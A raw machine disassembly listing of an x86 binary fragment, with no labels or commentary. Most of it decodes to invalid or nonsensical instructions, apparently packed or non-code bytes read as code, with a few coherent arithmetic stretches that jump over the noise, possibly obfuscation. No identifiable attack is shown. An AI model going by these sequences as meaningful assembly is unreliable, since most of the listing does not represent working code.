  40c779:	scas   eax,DWORD PTR es:[edi]
  40c77a:	adc    DWORD PTR [edx+0x5a],edi
  40c77d:	push   0xa0c73ee7
  40c782:	repz in eax,dx
  40c784:	dec    eax
  40c785:	fiadd  DWORD PTR [edi+0x5fc630ac]
  40c78b:	(bad)  
  40c78c:	jnp    0x40c7be
  40c78e:	fisub  DWORD PTR [edi+edi*2+0x58e9921a]
  40c795:	mov    es:0x1da92eef,eax
  40c79b:	in     al,0xbd
  40c79d:	iret   
  40c79e:	ret    0x54c8
  40c7a1:	or     bh,BYTE PTR [bx+di]
  40c7a4:	(bad)  
  40c7a6:	aaa    
  40c7a7:	xchg   ecx,eax
  40c7a8:	xor    eax,0x77b20641
  40c7ad:	js     0x40c76a
  40c7af:	xor    al,0xd1
  40c7b1:	(bad)  
  40c7b3:	addr16 dec edx
  40c7b5:	ins    BYTE PTR es:[edi],dx
  40c7b6:	div    BYTE PTR [edi-0x31fd6bf5]
  40c7bc:	cdq    
  40c7bd:	das    
  40c7be:	pmaxub mm6,QWORD PTR [edi]
  40c7c1:	loopne 0x40c768
  40c7c3:	stc    
  40c7c4:	jl     0x40c7ae
  40c7c6:	nop
  40c7c7:	jg     0x40c823
  40c7c9:	adc    DWORD PTR [eax+0x4b7053cc],esp
  40c7cf:	push   esp
  40c7d0:	inc    edx
  40c7d1:	cmp    ecx,DWORD PTR [edx-0x62]
  40c7d4:	inc    edx
  40c7d5:	inc    ebx
  40c7d6:	rcl    BYTE PTR [ecx],0xa7
  40c7d9:	jno    0x40c773
  40c7db:	xchg   esi,eax
  40c7dc:	cmc    
  40c7dd:	out    0xfc,al
  40c7df:	(bad)  
  40c7e0:	cld    
  40c7e1:	rcr    ecx,1
  40c7e3:	and    ch,BYTE PTR [eax-0x4464f99c]
  40c7e9:	jne    0x40c7a7
  40c7eb:	mov    DWORD PTR [edx-0x7],ebp
  40c7ee:	sub    cl,BYTE PTR [edx+0x22f5eb68]
  40c7f4:	out    dx,eax
  40c7f5:	int    0x5f
  40c7f7:	mov    eax,ds:0xa804b6c4
  40c7fc:	out    dx,al
  40c7fd:	dec    esi
  40c7fe:	imul   ecx,DWORD PTR [edi],0xffffff85
  40c801:	dec    ecx
  40c802:	popa   
  40c803:	xchg   DWORD PTR [edx],edx
  40c805:	push   edi
  40c806:	push   eax
  40c807:	dec    ebp
  40c808:	and    dh,ch
  40c80a:	jecxz  0x40c7d3
  40c80c:	or     al,0xe5
  40c80e:	mov    ds:0xf44b28ce,eax
  40c813:	fadd   QWORD PTR [eax+0x1648fc00]
  40c819:	shl    esp,0xdf
  40c81c:	test   ecx,0x32bc7774
  40c822:	pop    edx
  40c823:	or     al,0x94
  40c825:	or     BYTE PTR [edi+0x19],0x29
  40c829:	ret    0xd18f
  40c82c:	iret   
  40c82d:	cmc    
  40c82e:	gs mov edx,0xa1d283f1
  40c834:	clc    
  40c835:	cmp    BYTE PTR [ebx-0x43a1b260],al
  40c83b:	xchg   BYTE PTR [esi-0x7e8c33bc],bl
  40c841:	xor    dh,BYTE PTR [ebx]
  40c843:	sub    eax,ecx
  40c845:	and    esp,DWORD PTR [ebx-0x5c748e18]
  40c84b:	fild   WORD PTR [edx]
  40c84d:	lea    eax,[ecx]
  40c84f:	jns    0x40c850
  40c851:	push   esi
  40c852:	test   eax,0xee34bb13
  40c857:	hlt    
  40c858:	mov    esp,0xa2e095f8
  40c85d:	(bad)  
  40c85e:	enter  0x6be1,0x1d
  40c862:	mov    gs,WORD PTR [edi]
  40c864:	shr    DWORD PTR [ecx],cl
  40c866:	test   BYTE PTR [ebx-0x33],0x7
  40c86a:	scas   eax,DWORD PTR es:[edi]
  40c86b:	xor    ebp,DWORD PTR [ebx+0xe87dbcf]
  40c871:	sub    cl,BYTE PTR [edx]
  40c873:	mov    esp,esp
  40c875:	inc    ebx
  40c876:	pop    ecx
  40c877:	mov    eax,0x7568301a
  40c87c:	hlt    
  40c87d:	inc    eax
  40c87e:	in     al,0x9f
  40c880:	ret    
  40c881:	mov    bh,0x2d
  40c883:	in     al,dx
  40c884:	and    al,0xbd
  40c886:	leave  
  40c887:	out    0x26,al
  40c889:	sbb    ah,BYTE PTR [ecx]
  40c88b:	fisubr WORD PTR [edx-0x71b2f7d2]
  40c891:	push   ds
  40c892:	adc    BYTE PTR [edx+0x2b],bl
  40c895:	xbegin 0x9fc77d78
  40c89b:	ins    DWORD PTR es:[edi],dx
  40c89c:	mov    dh,0x1c
  40c89e:	adc    esp,DWORD PTR [ecx]
  40c8a0:	cmp    DWORD PTR [esi],eax
  40c8a2:	call   DWORD PTR [edx+0x6e]
  40c8a5:	pushf  
  40c8a6:	add    DWORD PTR [esi+ecx*4-0xc2806e8],esp
  40c8ad:	shl    BYTE PTR [ecx+0x6d],1
  40c8b0:	stos   BYTE PTR es:[edi],al
  40c8b1:	(bad)  
  40c8b2:	clc    
  40c8b3:	pop    ecx
  40c8b4:	xor    al,0x83
  40c8b6:	push   ss
  40c8b7:	lea    eax,[ebp+0x77]
  40c8ba:	lods   eax,DWORD PTR ds:[esi]
  40c8bb:	adc    al,0x34
  40c8bd:	retf   
  40c8be:	mov    esi,0x8dbbb9d9
  40c8c3:	adc    DWORD PTR es:[eax+0x4c6d099c],0x9e925968
  40c8ce:	add    DWORD PTR [ebx-0x2a7f06cf],edx
  40c8d4:	(bad)  
  40c8d5:	rol    BYTE PTR [ebx],cl
  40c8d7:	xchg   BYTE PTR [ebx+esi*8+0x27],ah
  40c8db:	fsubr  DWORD PTR [edi+0x467ceec2]
  40c8e1:	fcomp  QWORD PTR [eax+ebx*8-0x66c7a7e0]
  40c8e8:	das    
  40c8e9:	icebp  
  40c8ea:	push   edx
  40c8eb:	loop   0x40c967
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	js     0x40c91f
  40c91a:	aas    
  40c91b:	sub    ah,0x94
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c929
  40c925:	ss and al,0xf8
  40c928:	inc    esi
  40c929:	mov    eax,0x61b0fd9d
  40c92e:	pop    ss
  40c92f:	pop    es
  40c930:	(bad)  
  40c931:	jbe    0x40c8eb
  40c933:	mov    ds:0x94a8c392,eax
  40c938:	cmp    bh,ah
  40c93a:	inc    edx
  40c93b:	(bad)  
  40c93c:	int3   
  40c93d:	push   ds
  40c93e:	out    dx,eax
  40c93f:	cli    
  40c940:	xchg   esi,eax
  40c941:	lods   eax,DWORD PTR ds:[esi]
  40c942:	inc    esi
  40c943:	cmp    eax,0xf7114001
  40c948:	xor    DWORD PTR [eax],eax
  40c94a:	(bad)
  40c94f:	lods   eax,DWORD PTR ds:[esi]
  40c950:	std    
  40c951:	cmp    ebp,ecx
  40c953:	jmp    0xc2e5:0x738b2069
  40c95a:	sbb    al,0x30
  40c95c:	dec    esp
  40c95d:	mov    ah,0x85
  40c95f:	cld    
  40c960:	in     al,dx
  40c961:	dec    esp
  40c962:	mov    edx,DWORD PTR [esp+ecx*4-0x9]
  40c966:	call   DWORD PTR [ebx-0x64717edc]
  40c96c:	mov    bl,0xe8
  40c96e:	or     esi,DWORD PTR [ebx+0x47]
  40c971:	int    0x85
  40c973:	jne    0x40c970
  40c975:	sub    cl,BYTE PTR [ebp+0x5b4c8caa]
  40c97b:	cmc    
  40c97c:	jne    0x40c9a8
  40c97e:	scas   eax,DWORD PTR es:[edi]
  40c97f:	sbb    BYTE PTR [edi-0x35ff23b4],ch
  40c985:	addr16 xchg edi,eax
  40c987:	sub    esi,DWORD PTR [ebp+ebp*4+0x6bde576b]
  40c98e:	punpckldq mm2,DWORD PTR es:[eax*4+0x6de0c2e0]
  40c997:	cmp    eax,0x4fb01504
  40c99c:	jge    0x40c935
  40c99e:	jge    0x40c9a4
  40c9a0:	in     eax,0xf3
  40c9a2:	neg    BYTE PTR [eax]
  40c9a4:	ret    
  40c9a5:	cdq    
  40c9a6:	mov    bh,0x84
  40c9a8:	ja     0x40c96d
  40c9aa:	mov    edi,0xda3b7231
  40c9af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9b0:	jp     0x40c9de
  40c9b2:	sti    
  40c9b3:	inc    esi
  40c9b4:	scas   eax,DWORD PTR es:[edi]
  40c9b5:	inc    ecx
  40c9b6:	xor    eax,0x80095c7d
  40c9bb:	add    DWORD PTR [eax+0x29],edi
  40c9be:	test   DWORD PTR [ecx-0x2f],ebx
  40c9c1:	and    al,0x8c
  40c9c3:	enter  0x4cb0,0x78
  40c9c7:	mov    ds:0x41a25d6c,al
  40c9cc:	xor    BYTE PTR [edi],bl
  40c9ce:	shl    BYTE PTR [ebx+0x32],1
  40c9d1:	adc    al,0xf6
  40c9d3:	adc    DWORD PTR [edx-0x41],esi
  40c9d6:	outs   dx,BYTE PTR ds:[esi]
  40c9d7:	add    DWORD PTR ds:0xf63d2470,ecx
  40c9dd:	inc    BYTE PTR [edi+eiz*1]
  40c9e0:	push   es
  40c9e1:	scas   eax,DWORD PTR es:[edi]
  40c9e2:	sbb    BYTE PTR [edx-0x35],ah
  40c9e5:	mov    eax,ds:0xd6320372
  40c9ea:	daa    
  40c9eb:	fist   WORD PTR es:[esi]
  40c9ee:	ja     0x40c9ed
  40c9f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9f1:	pusha  
  40c9f2:	mov    esp,0x5b110536
  40c9f7:	mov    al,0xb7
  40c9f9:	push   es
  40c9fa:	inc    edx
  40c9fb:	(bad)  
  40c9fc:	push   edx
  40c9fd:	inc    eax
  40c9fe:	sbb    DWORD PTR [ebx-0x78],ecx
  40ca01:	cld    
  40ca02:	repz (bad) 
  40ca05:	in     al,dx
  40ca06:	jl     0x40ca3e
  40ca08:	aad    0x7c
  40ca0a:	add    ebp,eax
  40ca0c:	adc    edi,DWORD PTR [eax]
  40ca0e:	cld    
  40ca0f:	fstp   QWORD PTR [ecx+0x574d12be]
  40ca15:	mov    ebp,0xe548f5df
  40ca1a:	xor    bl,BYTE PTR [edx-0x18]
  40ca1d:	out    dx,al
  40ca1e:	mov    ah,0x8f
  40ca20:	pop    ss
  40ca21:	popf   
  40ca22:	xchg   esi,eax
  40ca23:	jp     0x40ca3a
  40ca25:	(bad)
  40ca28:	jmp    FWORD PTR [eax-0x38]
  40ca2b:	inc    edi
  40ca2c:	and    edi,DWORD PTR [ebp+0x1d]
  40ca2f:	in     al,dx
  40ca30:	and    eax,0x3455e594
  40ca35:	rcr    DWORD PTR [ebp+eiz*1-0x4648c47a],0x75
  40ca3d:	stos   BYTE PTR es:[edi],al
  40ca3e:	mov    al,0x6
  40ca40:	sbb    DWORD PTR [ebx-0x53e1c70d],edi
  40ca46:	ins    DWORD PTR es:[edi],dx
  40ca47:	aad    0xa7
  40ca49:	add    eax,0x68fa751f
  40ca4e:	mov    dl,0xdc
  40ca50:	inc    edx
  40ca51:	xchg   ebp,eax
  40ca52:	mov    ah,0x1
  40ca54:	test   BYTE PTR [esi],dh
  40ca56:	jmp    0x40ca7d
  40ca58:	in     eax,dx
  40ca59:	fcomp  DWORD PTR ds:0x403c653
  40ca5f:	push   DWORD PTR [ecx+esi*8-0x4030576f]
  40ca66:	cwde   
  40ca67:	jae    0x40caa7
  40ca69:	push   ss
  40ca6a:	sti    
  40ca6b:	fldcw  WORD PTR [eax-0x21]
  40ca6e:	mov    DWORD PTR [edi-0x15],edx
  40ca71:	mov    esi,0x47a811bc
  40ca76:	gs js  0x40ca00
  40ca79:	dec    esi
  40ca7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca7b:	scas   eax,DWORD PTR es:[edi]
  40ca7c:	sbb    edx,DWORD PTR [edi-0x49f428b3]
  40ca82:	call   0x1ee7b7b2
  40ca87:	sti    
  40ca88:	push   ebx
  40ca89:	into   
  40ca8a:	fidiv  WORD PTR [esi+edi*4-0x3df34023]
  40ca91:	adc    al,0x6e
  40ca93:	cli    
  40ca94:	out    0x5d,eax
  40ca96:	es dec ebx
  40ca98:	cmp    al,0xe3
  40ca9a:	sub    BYTE PTR [eax+0x45],bl
  40ca9d:	inc    eax
  40ca9e:	imul   esp,DWORD PTR [esi-0x408778c7],0xffffff89
  40caa5:	aad    0x30
  40caa7:	push   esi
  40caa8:	add    al,0x0
  40caaa:	call   0xbcea0b43
  40caaf:	clc    
  40cab0:	ss scas eax,DWORD PTR es:[edi]
  40cab2:	or     bl,BYTE PTR [eax+0x760afa6d]
  40cab8:	mov    ch,0xf0
  40caba:	push   ebx
  40cabb:	jl     0x40caeb
  40cabd:	push   0x7
  40cabf:	pop    esi
  40cac0:	test   DWORD PTR [ebx+0x21],ebp
  40cac3:	inc    ebp
  40cac4:	jb     0x40cb25
  40cac6:	adc    al,0x16
  40cac8:	mov    bh,0x1a
  40caca:	fucomp st(0)
  40cacc:	imul   ebp,DWORD PTR [ebp*2+0x2416414c],0xffffff8a
  40cad4:	ret    0x3b6
  40cad7:	pop    ecx
  40cad8:	test   edx,edi
  40cada:	xor    dh,cl
  40cadc:	jne    0x40ca97
  40cade:	inc    eax
  40cadf:	push   esi
  40cae0:	dec    eax
  40cae1:	dec    ecx
  40cae2:	iret   
  40cae3:	aaa    
  40cae4:	push   ds
  40cae5:	aam    0xf
  40cae7:	and    eax,0xfd92aa6e
  40caec:	ret    0x9088
  40caef:	push   esp
  40caf0:	popf   
  40caf1:	retf   0x1590
  40caf4:	sub    ah,dl
  40caf6:	into   
  40caf7:	(bad)  
  40caf8:	sahf   
  40caf9:	sub    DWORD PTR [eax+0x615a9d70],edx
  40caff:	and    BYTE PTR [edx+esi*8],bh
  40cb02:	pop    edx
  40cb03:	fs pop esp
  40cb05:	cmp    ebx,DWORD PTR [edi+ebx*1+0x44]
  40cb09:	jmp    0x40cabf
  40cb0b:	sub    esi,DWORD PTR [esi]
  40cb0d:	push   es
  40cb0e:	jno    0x40cb54
  40cb10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb11:	pop    ecx
  40cb12:	fs pusha 
  40cb14:	cmp    al,0x4e
  40cb16:	test   al,0x3c
  40cb18:	xchg   esp,eax
  40cb19:	push   0x12
  40cb1b:	xor    eax,0xba36c244
  40cb20:	inc    esi
  40cb21:	loop   0x40caf9
  40cb23:	mov    ch,dh
  40cb25:	jno    0x40cb2c
  40cb27:	xor    bh,BYTE PTR [edx+eax*1+0x2ef01630]
  40cb2e:	fcmovnbe st,st(1)
  40cb30:	or     esp,esi
  40cb32:	lds    edx,FWORD PTR [edx+0x3b23d683]
  40cb38:	sub    edx,0x98c62d9
  40cb3e:	rol    DWORD PTR [eax-0x46],1
  40cb41:	out    0xd,eax
  40cb43:	xchg   esi,eax
  40cb44:	cmp    BYTE PTR [ebp+0x20],0x44
  40cb48:	hlt    
  40cb49:	mov    ebp,0x8105edc0
  40cb4e:	jb     0x40cb14
  40cb50:	jns    0x40cb69
  40cb52:	pushf  
  40cb53:	or     dh,BYTE PTR [ecx]
  40cb55:	mov    edx,0x551bc7c8
  40cb5a:	or     ch,BYTE PTR [eax-0x313df2e3]
  40cb60:	mov    esp,0xa1b64234
  40cb65:	loope  0x40cbac
  40cb67:	xor    esp,DWORD PTR [edi]
  40cb69:	inc    esi
  40cb6b:	push   0x86ec28fb
  40cb70:	cli    
  40cb71:	xchg   ecx,eax
  40cb72:	(bad)  
  40cb74:	fldcw  WORD PTR [edx]
  40cb76:	mov    esi,0x5c761895
  40cb7b:	mov    esp,0x7abbcddb
  40cb80:	or     al,0x4b
  40cb82:	imul   ebx,DWORD PTR [eax+ebx*4+0x2662baf5],0x12
  40cb8a:	cli    
  40cb8b:	xchg   ebp,eax
  40cb8c:	dec    edi
  40cb8d:	push   ss
  40cb8e:	sbb    DWORD PTR [eax],0x151f699b
  40cb94:	push   edi
  40cb95:	jo     0x40cb5d
  40cb97:	(bad)  
  40cb98:	bound  esp,QWORD PTR [ecx+ebp*8-0x6ccb16c9]
  40cb9f:	out    dx,al
  40cba0:	pop    esp
  40cba1:	fistp  WORD PTR [eax-0x18]
  40cba4:	xchg   edx,eax
  40cba5:	mov    edx,DWORD PTR [edi+0x59]
  40cba8:	ja     0x40cb37
  40cbaa:	xor    al,0x67
  40cbac:	cmp    dh,BYTE PTR [edi]
  40cbae:	int    0xba
  40cbb0:	in     eax,0x98
  40cbb2:	push   ebx
  40cbb3:	inc    ecx
  40cbb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb5:	xchg   ebx,eax
  40cbb6:	mov    al,dh
  40cbb8:	dec    edx
  40cbb9:	loope  0x40cba1
  40cbbb:	pop    ebp
  40cbbc:	ins    BYTE PTR es:[edi],dx
  40cbbd:	daa    
  40cbbe:	pop    ebx
  40cbbf:	mov    bh,0x73
  40cbc1:	loopne 0x40cbbf
  40cbc3:	push   es
  40cbc4:	or     esp,DWORD PTR [edi-0x67]
  40cbc7:	gs and ch,cl
  40cbca:	loope  0x40cbaf
  40cbcc:	pop    ebx
  40cbcd:	add    BYTE PTR [ecx],bh
  40cbcf:	cdq    
  40cbd0:	test   DWORD PTR [esi+0x7a8b65d1],esp
  40cbd6:	rcl    BYTE PTR [ecx+0x21],cl
  40cbd9:	mov    ebx,0xc03f824b
  40cbde:	lahf   
  40cbdf:	fld    st(2)
  40cbe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbe2:	rcr    bh,cl
  40cbe4:	push   ecx
  40cbe5:	mov    ?,edx
  40cbe7:	enter  0x75ab,0x24
  40cbeb:	inc    esp
  40cbec:	sbb    BYTE PTR gs:[ebx-0x748946fb],ch
  40cbf3:	jp     0x40cb7f
  40cbf5:	cmp    esp,DWORD PTR [edi-0x60a89dfd]
  40cbfb:	xchg   edx,eax
  40cbfc:	push   cs
  40cbfd:	cmp    ecx,ebx
  40cbff:	test   BYTE PTR [ecx+0x3041c8b5],cl
  40cc05:	les    esi,FWORD PTR [edi]
  40cc07:	or     eax,0xf8725ee1
  40cc0c:	inc    edx
  40cc0d:	mov    ebp,0x76083bcb
  40cc12:	into   
  40cc13:	push   edi
  40cc14:	loop   0x40cc8e
  40cc16:	cmp    eax,0x43264597
  40cc1b:	lahf   
  40cc1c:	adc    al,0x43
  40cc1e:	ret    
  40cc1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc20:	fwait
  40cc21:	cmp    DWORD PTR [edx-0x590eccbe],edi
  40cc27:	and    edi,ecx
  40cc29:	adc    ecx,eax
  40cc2b:	pop    es
  40cc2c:	aaa    
  40cc2d:	fisubr WORD PTR [edx-0x3a696e00]
  40cc33:	dec    DWORD PTR [esi-0x31372657]
  40cc39:	test   ah,dh
  40cc3b:	and    BYTE PTR [esi+edi*2],ch
  40cc3e:	and    esp,DWORD PTR [ebx+0x60]
  40cc41:	shl    ecx,1
  40cc43:	es xor al,0x8
  40cc46:	adc    esi,DWORD PTR [ecx+eax*1-0x146aa8cd]
  40cc4d:	js     0x40cc26
  40cc4f:	or     ecx,esi
  40cc51:	mov    eax,ds:0xde0a8e4d
  40cc56:	cmc    
  40cc57:	js     0x40cc61
  40cc59:	sub    dh,BYTE PTR [edi-0x66]
  40cc5c:	adc    DWORD PTR [ebx-0x6a],edx
  40cc5f:	out    dx,eax
  40cc60:	imul   edx,DWORD PTR [ebp+0xdb811e0],0x787cfc6a
  40cc6a:	(bad)  
  40cc6b:	aas    
  40cc6c:	cmp    DWORD PTR [ebp+0x5e],0xffffff86
  40cc70:	push   edi
  40cc71:	aam    0x41
  40cc73:	and    cl,BYTE PTR [ebx+eax*1+0x446cc9f8]
  40cc7a:	sub    BYTE PTR [eax+0x1d3e9887],0x91
  40cc81:	out    dx,eax
  40cc82:	sti    
  40cc83:	test   BYTE PTR [ebx],bh
  40cc85:	test   eax,0xb0c0e772
  40cc8a:	sbb    DWORD PTR [ebp+ebp*1+0x7b],ecx
  40cc8e:	inc    edi
  40cc8f:	or     esp,DWORD PTR [ecx+0x67]
  40cc92:	pop    ds
  40cc93:	jne    0x40cc37
  40cc95:	sbb    BYTE PTR [esi+esi*1-0x2],ch
  40cc99:	jecxz  0x40ccc7
  40cc9b:	mov    cl,0xf4
  40cc9d:	mov    WORD PTR [ecx-0x1e1417e7],fs
  40cca3:	fwait
  40cca4:	push   ebx
  40cca5:	ret    0x979c
  40cca8:	sbb    dl,dh
  40ccaa:	pop    ebx
  40ccab:	lock mov edx,0xb4f23098
  40ccb1:	fisttp WORD PTR ds:0x68e8575
  40ccb7:	add    eax,0x784225a5
  40ccbc:	fcomp  QWORD PTR [edx+0x67]
  40ccbf:	icebp  
  40ccc0:	into   
  40ccc1:	dec    BYTE PTR [edi+edi*8]
  40ccc4:	jmp    0xf903:0xd103f833
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	xor    edi,0xffffffb7
  40cd18:	aaa    
  40cd19:	les    ecx,FWORD PTR [ebx]
  40cd1b:	nop
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40ccef
  40cd23:	(bad)  
  40cd24:	jmp    0x40cd37
  40cd26:	js     0x40ccb7
  40cd28:	xor    ecx,DWORD PTR [ebx+0x76e9fdf0]
  40cd2e:	shl    BYTE PTR [ebp+0x2f0fb6b],1
  40cd34:	xlat   BYTE PTR ds:[ebx]
  40cd35:	jbe    0x40cd91
  40cd37:	jnp    0x40cd40
  40cd39:	mov    edx,0x33d4b09a
  40cd3e:	inc    esi
  40cd3f:	out    0x7f,eax
  40cd41:	xor    ebp,DWORD PTR [esi+0x55]
  40cd44:	mov    dl,0x22
  40cd46:	or     DWORD PTR [ebp-0x49],ebx
  40cd49:	test   cl,cl
  40cd4b:	loope  0x40ccd5
  40cd4d:	cdq    
  40cd4e:	push   edx
  40cd4f:	or     ebx,edi
  40cd51:	repnz outs dx,DWORD PTR ds:[esi]
  40cd53:	xor    bh,BYTE PTR ds:0x73f4e4e2
  40cd59:	bound  ecx,QWORD PTR [esi+0x3c]
  40cd5c:	add    cl,dh
  40cd5e:	repz ds pushf 
  40cd61:	outs   dx,BYTE PTR ds:[esi]
  40cd62:	sbb    bl,ah
  40cd64:	ss mov ebx,0x424f4959
  40cd6a:	cwde   
  40cd6b:	test   al,0xb2
  40cd6d:	jns    0x40cde9
  40cd6f:	clc    
  40cd70:	jmp    0xcadc:0xf0adaad7
  40cd77:	ret    0x7be7
  40cd7a:	shl    BYTE PTR [ebp+0x54],cl
  40cd7d:	fcomi  st,st(7)
  40cd7f:	popa   
  40cd80:	cmp    BYTE PTR [ecx+0x593279e3],dh
  40cd86:	add    cl,BYTE PTR [edx-0x39f35e4d]
  40cd8c:	mov    gs,WORD PTR [eax+ebp*2]
  40cd8f:	mov    al,ds:0x870f0d03
  40cd94:	call   0xd26f2dc4
  40cd99:	inc    esp
  40cd9a:	pop    ebp
  40cd9b:	clc    
  40cd9c:	and    al,BYTE PTR [edx+eiz*1]
  40cd9f:	xchg   ebp,eax
  40cda0:	add    dl,dh
  40cda2:	add    al,0xa7
  40cda4:	aaa    
  40cda5:	imul   edx,DWORD PTR [ecx+0x49],0xffffffd4
  40cda9:	and    BYTE PTR [edx+0x49d7a47e],dh
  40cdaf:	or     eax,0xd88e20db
  40cdb4:	pop    ecx
  40cdb5:	cmp    BYTE PTR gs:[esi+0x5c],dl
  40cdb9:	xor    DWORD PTR [esp+edi*1],0x56
  40cdbd:	adc    cl,bh
  40cdbf:	jbe    0x40cd61
  40cdc1:	add    bh,0xfc
  40cdc4:	push   0x4f
  40cdc6:	in     al,dx
  40cdc7:	xchg   esp,eax
  40cdc8:	pop    edx
  40cdc9:	mov    ch,0x19
  40cdcb:	and    ah,bh
  40cdcd:	inc    eax
  40cdce:	lods   al,BYTE PTR ds:[esi]
  40cdcf:	daa    
  40cdd0:	enter  0xa26,0xef
  40cdd4:	out    dx,eax
  40cdd5:	sar    DWORD PTR [eax-0x10ca3011],0xf9
  40cddc:	jns    0x40cdfb
  40cdde:	mov    eax,esp
  40cde0:	enter  0x937e,0x53
  40cde4:	hlt    
  40cde5:	popa   
  40cde6:	popa   
  40cde7:	neg    DWORD PTR [ebp-0x4]
  40cdea:	jle    0x40cdc1
  40cdec:	fimul  WORD PTR [edi-0x35]
  40cdef:	addr16 xor eax,0x85da5493
  40cdf5:	jnp    0x40ce75
  40cdf7:	mov    bh,0x29
  40cdf9:	jge    0x40ce6c
  40cdfb:	adc    BYTE PTR [ebx-0x17bbbb3e],bl
  40ce01:	fucom  st(2)
  40ce03:	les    esp,FWORD PTR [ecx]
  40ce05:	dec    esp
  40ce06:	xor    BYTE PTR [ebx],0x80
  40ce09:	sbb    al,0x7e
  40ce0b:	rcl    DWORD PTR cs:[esi],cl
  40ce0e:	push   ecx
  40ce0f:	or     ch,0x6e
  40ce12:	int3   
  40ce13:	push   ecx
  40ce14:	or     dl,BYTE PTR [ecx-0x39a2e8a8]
  40ce1a:	in     al,dx
  40ce1b:	lods   eax,DWORD PTR ds:[esi]
  40ce1c:	leave  
  40ce1d:	mov    dh,0x7f
  40ce1f:	or     cl,BYTE PTR [ebx+0x678a9496]
  40ce25:	push   ss
  40ce26:	sbb    eax,0x80eec172
  40ce2b:	inc    edx
  40ce2c:	push   ss
  40ce2d:	ins    BYTE PTR es:[edi],dx
  40ce2e:	and    BYTE PTR [edx],ah
  40ce30:	lock pop eax
  40ce32:	adc    BYTE PTR [edi],bl
  40ce34:	sbb    edx,DWORD PTR [edi+0x38]
  40ce37:	xchg   esi,eax
  40ce38:	cmp    eax,0x7d7a46d7
  40ce3d:	add    eax,0x7daefae4
  40ce42:	stos   BYTE PTR es:[edi],al
  40ce43:	cmp    dh,al
  40ce45:	sbb    al,BYTE PTR es:[eax+ebp*4-0x5e]
  40ce4a:	cmp    al,0xd6
  40ce4c:	es pusha 
  40ce4e:	outs   dx,BYTE PTR ds:[esi]
  40ce4f:	retf   0x5fae
  40ce52:	xchg   BYTE PTR [ebx-0x23c4118],al
  40ce58:	out    0x25,eax
  40ce5a:	inc    esp
  40ce5b:	sub    BYTE PTR [ecx+edx*1+0x4c68484a],ah
  40ce62:	and    DWORD PTR [eax],edi
  40ce64:	not    DWORD PTR [esi]
  40ce66:	mov    BYTE PTR [ebx-0x211e8c57],0xaf
  40ce6d:	push   edx
  40ce6e:	jp     0x40ce47
  40ce70:	pop    esp
  40ce71:	popa   
  40ce72:	pop    es
  40ce73:	mov    BYTE PTR [esi],ah
  40ce75:	lahf   
  40ce76:	sub    eax,0xe8e2608
  40ce7b:	call   0x65f0b293
  40ce80:	dec    ebp
  40ce81:	cwde   
  40ce82:	adc    ch,dh
  40ce84:	jae    0x40ced5
  40ce86:	and    eax,0x7c328c97
  40ce8b:	mov    dh,0x50
  40ce8d:	ret    0xbc41
  40ce90:	fcomp  QWORD PTR [eax+0x70d05852]
  40ce96:	rcl    BYTE PTR [eax-0x2a47c4be],cl
  40ce9c:	jns    0x40ce9b
  40ce9e:	mov    ch,0x95
  40cea0:	sbb    BYTE PTR [ecx-0x79c2927],cl
  40cea6:	xor    ecx,esi
  40cea8:	jmp    0xfd6:0x74d0d68d
  40ceaf:	jb     0x40ced2
  40ceb1:	pop    ebp
  40ceb2:	sub    eax,0xed5ba176
  40ceb7:	and    DWORD PTR [ebp+eiz*8+0x6935492],ebp
  40cebe:	dec    ecx
  40cebf:	dec    ebp
  40cec0:	mov    BYTE PTR [ebp+0x11b0bf7d],bl
  40cec6:	(bad)  
  40cec7:	mov    edx,0x89347fb6
  40cecc:	xor    DWORD PTR [esp+edi*2+0x50436539],ebx
  40ced3:	xor    eax,DWORD PTR [edi+0x54]
  40ced6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ced7:	mov    bh,0x99
  40ced9:	add    dl,bl
  40cedb:	mov    al,ds:0x259bcc96
  40cee0:	pop    edx
  40cee1:	and    DWORD PTR [edi+0x7536ff94],ebp
  40cee7:	cwde   
